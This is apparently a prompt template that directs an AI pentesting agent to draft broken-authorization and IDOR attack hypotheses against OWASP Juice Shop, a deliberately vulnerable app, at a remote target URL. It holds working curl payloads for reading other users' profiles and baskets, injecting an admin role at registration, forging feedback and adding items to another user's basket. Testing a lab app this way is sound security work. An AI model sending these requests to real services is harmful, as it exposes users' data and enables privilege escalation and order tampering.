# Phase 1d — Broken Authorization / IDOR Analysis

CRITICAL: The target is a REMOTE server at {{TARGET_URL}}.
Do NOT assume localhost. Do NOT use 127.0.0.1.
Use the provided {{TARGET_URL}} for ALL requests.

## Objective

Analyse the reconnaissance data and known vulnerabilities to produce **Broken Authorization and Insecure Direct Object Reference (IDOR) attack hypotheses** targeting the OWASP Juice Shop at {{TARGET_URL}}. Focus on **horizontal privilege escalation (accessing other users' data), vertical privilege escalation (gaining admin access), and missing access controls on sensitive API endpoints**.

Each hypothesis must be specific, actionable, and grounded in evidence from the recon phase. Do NOT guess — cite specific endpoints, parameters, and evidence.

## Input Data

### Recon Report

{{RECON_DATA}}

### Known Vulnerabilities

{{KNOWN_VULNS}}

## Analysis Instructions

1. **Map all CRUD endpoints** from the recon report and identify which require authentication and which enforce authorization (i.e., check that the authenticated user owns the requested resource).
2. **Identify numeric ID parameters** in URL paths (`/api/Users/:id`, `/rest/basket/:id`, `/api/Feedbacks/:id`) — these are prime IDOR targets.
3. **Test horizontal access:** Can User A's JWT be used to access User B's resources by changing the `:id` parameter?
4. **Test vertical access:** Can a regular user's JWT be used to access admin-only endpoints (`/api/Users`, `POST /api/Products`, `/#/administration`)?
5. **Check for mass assignment:** Can additional fields (e.g., `role`, `isAdmin`) be injected into registration or profile update requests?
6. **Identify missing authentication:** Are any sensitive endpoints accessible without any JWT at all?
7. **Cross-reference with known Juice Shop challenges:** View Basket, Manipulate Basket, Admin Registration, Product Tampering, Deluxe Fraud.

## Juice Shop Authorization-Specific Context

### User Model
- Users have `id`, `email`, `password`, `role` fields
- Roles: `customer` (default), `admin`, `accounting`, `deluxe`
- The `role` field may be settable during registration via mass assignment

### Basket Model
- Each user has a basket identified by numeric `id`
- Basket items belong to a basket via `BasketId` foreign key
- `/rest/basket/:id` should only be accessible by the basket owner — but may not be enforced

### Key IDOR Surfaces
| Endpoint | Expected Control | Potential Bypass |
|----------|-----------------|-----------------|
| `GET /api/Users/:id` | Admin only | Any authenticated user may access |
| `GET /rest/basket/:id` | Owner only | Change `:id` to another user's basket |
| `GET /api/Feedbacks/:id` | Owner or admin | Any authenticated user may read |
| `PUT /api/BasketItems/:id` | Owner only | Modify quantity/product in another user's basket item |
| `POST /rest/basket/:id/checkout` | Owner only | Checkout another user's basket |
| `POST /api/Products` | Admin only | Regular user may create products |
| `PUT /api/Products/:id` | Admin only | Regular user may modify product details |
| `GET /rest/memories` | Authenticated | May be accessible without authentication |

### Mass Assignment Targets
- `POST /api/Users` — include `"role":"admin"` in the registration JSON body
- `PUT /api/Users/:id` — add `"role":"admin"` to the profile update

## MANDATORY Hypotheses

Your output MUST include hypotheses for ALL of the following (at minimum):

1. **IDOR on `/api/Users/:id`** — any authenticated user can read any user's profile by changing the ID
2. **IDOR on `/rest/basket/:id`** — access another user's shopping basket by changing the basket ID
3. **IDOR on `/api/Feedbacks/:id`** — read another user's feedback by changing the feedback ID
4. **Basket item modification** — `PUT /api/BasketItems/:id` allows modifying items in another user's basket
5. **Admin role injection** — `POST /api/Users` with `"role":"admin"` in the JSON body creates an admin account
6. **Unauthorised product creation** — `POST /api/Products` accessible by a regular user
7. **Cross-user basket checkout** — `POST /rest/basket/:id/checkout` with another user's basket ID
8. **Deluxe membership payment bypass** — `POST /rest/deluxe-membership` without valid payment
9. **Anonymous access to `/rest/memories`** — accessible without any JWT
10. **View Basket IDOR** — view another user's basket via the frontend by manipulating the basket ID parameter
11. **Forged Feedback** — `POST /api/Feedbacks` with a spoofed `UserId` to submit feedback as another user
12. **Product tampering** — `PUT /api/Products/:id` to change product details (e.g., description, price)
13. **Manipulate Basket** — add items to another user's basket by specifying their `BasketId`

## Hypothesis Format

For EACH hypothesis, use this EXACT format:

```markdown
### Hypothesis N
**Endpoint:** <METHOD> <full URL path>
**Parameter:** <parameter name — URL path param, query param, or JSON body field>
**Authz Flaw Type:** <IDOR / vertical privilege escalation / mass assignment / missing authentication / missing authorization>
**Payload/Technique:** <specific request with manipulated parameter>
**Expected Result:** <what unauthorised access would look like — specific response content>
**Evidence from recon:** <reference to specific endpoint/finding from recon_report.md>
**Prerequisites:** <auth token needed — specify whose JWT and how to obtain it>
```

## Required Output

Produce a markdown document with the heading `## Hypotheses` followed by at least 10 numbered hypotheses. Example structure:

```markdown
## Hypotheses

### Hypothesis 1
**Endpoint:** GET /api/Users/1
**Parameter:** :id (URL path)
**Authz Flaw Type:** IDOR
**Payload/Technique:** Authenticate as a regular user (e.g., user ID 2), then request `GET /api/Users/1` with that user's JWT. If the response returns user 1's profile (admin), the endpoint lacks ownership validation.
**Expected Result:** Response 200 with admin user's profile JSON including email, role, and other fields.
**Evidence from recon:** /api/Users/:id endpoint identified in API surface enumeration; no authorization middleware observed in route definitions.
**Prerequisites:** Valid JWT from any authenticated user (obtain via login or registration)

### Hypothesis 2
**Endpoint:** GET /rest/basket/1
**Parameter:** :id (URL path)
**Authz Flaw Type:** IDOR
**Payload/Technique:** Authenticate as user ID 2, then request `GET /rest/basket/1` (admin's basket). If the response returns basket contents, the endpoint doesn't verify basket ownership.
**Expected Result:** Response 200 with basket contents JSON including product items and quantities.
**Evidence from recon:** /rest/basket/:id endpoint identified; basket ID is a sequential integer.
**Prerequisites:** Valid JWT from any authenticated user

### Hypothesis 3
...
```

## Payload Guidelines for Juice Shop Authorization Attacks

### IDOR Testing Pattern
```bash
# Step 1: Register a new user and get their JWT
curl -s -X POST "{{TARGET_URL}}/api/Users" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@test.com","password":"test1234","passwordRepeat":"test1234"}'

# Step 2: Login as the new user
TOKEN=$(curl -s -X POST "{{TARGET_URL}}/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@test.com","password":"test1234"}' | python -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])")

# Step 3: Try accessing other users' resources
curl -s "{{TARGET_URL}}/api/Users/1" -H "Authorization: Bearer $TOKEN"
curl -s "{{TARGET_URL}}/rest/basket/1" -H "Authorization: Bearer $TOKEN"
curl -s "{{TARGET_URL}}/api/Feedbacks/1" -H "Authorization: Bearer $TOKEN"
```

### Mass Assignment
```bash
# Register with admin role injected
curl -s -X POST "{{TARGET_URL}}/api/Users" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin2@test.com","password":"test1234","passwordRepeat":"test1234","role":"admin"}'
```

### Forged Feedback
```bash
# Submit feedback as another user (UserId 1 = admin)
curl -s -X POST "{{TARGET_URL}}/api/Feedbacks" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"UserId":1,"comment":"Forged feedback","rating":1}'
```

### Basket Manipulation
```bash
# Add an item to another user's basket
curl -s -X POST "{{TARGET_URL}}/api/BasketItems" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"ProductId":1,"BasketId":1,"quantity":1}'
```

Save the output as `hypotheses_authz.md` using the `save_deliverable` tool.
